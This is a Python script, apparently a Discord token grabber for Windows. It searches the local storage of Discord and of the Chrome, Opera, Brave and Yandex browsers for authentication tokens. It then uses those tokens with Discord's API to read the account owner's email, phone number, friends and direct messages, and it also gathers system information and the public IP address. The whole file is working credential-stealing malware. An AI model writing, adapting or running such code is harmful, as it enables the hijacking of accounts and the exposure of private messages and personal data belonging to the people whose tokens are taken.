from requests import get
from re import findall
from os import listdir, getenv, name, path
from subprocess import check_output
from json import loads

if name != 'nt':
      exit()

LOCAL = getenv("LOCALAPPDATA")
ROAMING = getenv("APPDATA")
SYSTEM = check_output("systeminfo",shell=True).decode('utf-8')
DATABASE = "\\Local Storage\\leveldb"

USERINFO = "https://discordapp.com/api/v6/users/@me"
FRIENDS = "https://discordapp.com/api/v6/users/@me/relationships"
CHANNELS = "https://discordapp.com/api/v6/users/@me/channels"
PAYMENT = "https://discordapp.com/api/v6/users/@me/billing/payment-sources"
IPADDR = "https://api.ipify.org"

BROWSERS = {
    "Discord"           : ROAMING + "\\Discord",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

validPaths = list()

for p in BROWSERS.values():
      p = p+DATABASE
      if path.exists(p):
            validPaths.append(p)

tokens = list()

def setHeaders(token):
      headers = {
            "User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/5360 (KHTML, like Gecko) Chrome/40.0.879.0 Mobile Safari/5360",
            "Authorization":token,
            "Content-Type":"application/json"
      }
      return headers

def getTokens():
      for p in validPaths:
            for files in listdir(p):
                  if files.endswith(".ldb") or files.endswith(".log"):
                        for l in [x.strip() for x in open(f"{p}\\{files}", errors="ignore").readlines() if x.strip()]:
                              for r in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                    for t in findall(r, l):
                                          if t not in tokens:
                                                tokens.append(t)

def getIP():
      reqIP = get(IPADDR)
      return reqIP.text

def getUserInfo(token):
      req = get(USERINFO, headers=setHeaders(token))
      resp = req.text
      data = loads(resp)
      print(f"""
USER INFORMATION

Token: {t}

ID: {data["id"]}
Username: {data["username"]}
Avatar: https://cdn.discordapp.com/avatars/{data["id"]}/{data["avatar"]}.gif
Bio: {data["bio"]}
Email: {data["email"]}
Phone Number: {data["phone"]}

MFA Enabled: {data["mfa_enabled"]}
Verified: {data["verified"]}
      """)

def getFriends(token):
      req = get(FRIENDS, headers=setHeaders(token))
      resp = req.text
      data = loads(resp)
      friends = ""
      for users in data:
            friends += f"ID: {users['id']} \nUsername: {users['user']['username']}\n "
      print(friends)


def getMessages(channelID,token):
      url = f"https://discordapp.com/api/v6/channels/{channelID}/messages"
      req = get(url, headers=setHeaders(token))
      resp = req.text
      data = loads(resp)
      i = 1
      msgs = list()
      for msg in data:
            if i == 1:
                  i += 1
                  continue
            msgs.append(f"{msg['author']['username']} - {msg['content']}")
      
      msgs.reverse()
      return msgs

def getChannels(token):
      req = get(CHANNELS, headers=setHeaders(token))
      resp = req.text
      data = loads(resp)
      for channel in data:
            channelID = channel["id"]
            users = ""
            for user in channel["recipients"]:
                  users += user["username"]
            messages = getMessages(channelID,token)
            print(f"""
Channel ID: {channelID}
User(s): {users}""")

def getPaymentMethods(token):
      req = get(PAYMENT, headers=setHeaders(token))
      resp = req.text
      data = loads(resp)
      return data

getTokens()

print("\nDISCORD INFORMATION")

for t in tokens:  

      getUserInfo(t)

      print("FRIENDS\n")
      getFriends(t)

      print("CHANNELS")
      getChannels(t)

      print("\n"+"-"*80)

print("\nSYSTEM INFORMATION\n")
print(f"\n{SYSTEM}\n")
print(f"Public IP Address: {getIP()}\n")